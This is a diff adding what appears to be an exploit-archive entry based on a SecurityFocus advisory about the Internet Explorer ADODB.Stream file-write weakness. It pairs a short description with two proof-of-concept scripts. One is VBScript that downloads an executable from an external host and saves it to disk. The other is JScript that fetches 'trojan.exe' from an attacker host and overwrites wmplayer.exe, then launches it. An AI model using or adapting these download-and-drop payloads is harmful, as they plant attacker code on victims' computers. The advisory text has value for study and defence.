@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/10514/info
+
+Microsoft Internet Explorer is prone to a security weakness that may permit malicious HTML documents to create or overwrite files on a victim file system when interpreted from the Local Zone (or other Security Zones with relaxed security restrictions, such as the Intranet Zone).
+
+This weakness depends on scripting that abuses the ADODB.Stream Object to write an attacker-specified file to the victim file system. In this manner, an HTML document that is interpreted in the context of a Security Zone with relaxed security restrictions may install a malicious file on the victim file system.
+
+Exploitation of this weakness typically requires other vulnerabilities to redirect the browser into the Local Zone (or other appropriate Security Zone) and then reference the malicious content once it has been written to the client file system. Other attack vectors also exist, such as enticing a user to download an HTML document to their system then opening it with the Web browser. HTML email may also provide an attack vector for this weakness (in combination with other vulnerabilities). Cross-site scripting and HTML injection vulnerabilities in Web applications may also provide a surreptitious attack vector in unsuspecting clients.
+
+This issue was publicized in August 2003 and was previously referenced in BID 8577 "Multiple Microsoft Internet Explorer Script Execution Vulnerabilities" but is now being assigned its own BID. There are numerous exploits and worms in the wild that depend on this issue, in tandem with other known vulnerabilities, to install malicious code on client computers. 
+
+<script language="vbscript">
+
+const adTypeBinary = 1
+const adSaveCreateOverwrite = 2
+const adModeReadWrite = 3
+
+set xmlHTTP = CreateObject("Microsoft.XMLHTTP")
+xmlHTTP.open "GET","http://ip3e83566f.speed.planet.nl/NOTEPAD.EXE",
+false
+xmlHTTP.send
+contents = xmlHTTP.responseBody
+
+Set oStr = CreateObject("ADODB.Stream")
+oStr.Mode = adModeReadWrite
+oStr.Type = adTypeBinary
+oStr.Open
+
+oStr.Write(contents)
+oStr.SaveToFile "c:\\test.exe", adSaveCreateOverwrite
+
+</script>
+
+This proof-of-concept was subsequently released by Jelmer to demonstrate how the issue may be used to overwrite wmplayer.exe:
+
+var x = new ActiveXObject("Microsoft.XMLHTTP");
+x.Open("GET", "http://attacker/trojan.exe",0);
+x.Send();
+
+var s = new ActiveXObject("ADODB.Stream");
+s.Mode = 3;
+s.Type = 1;
+s.Open();
+s.Write(x.responseBody);
+
+s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
+location.href = "mms://"; 
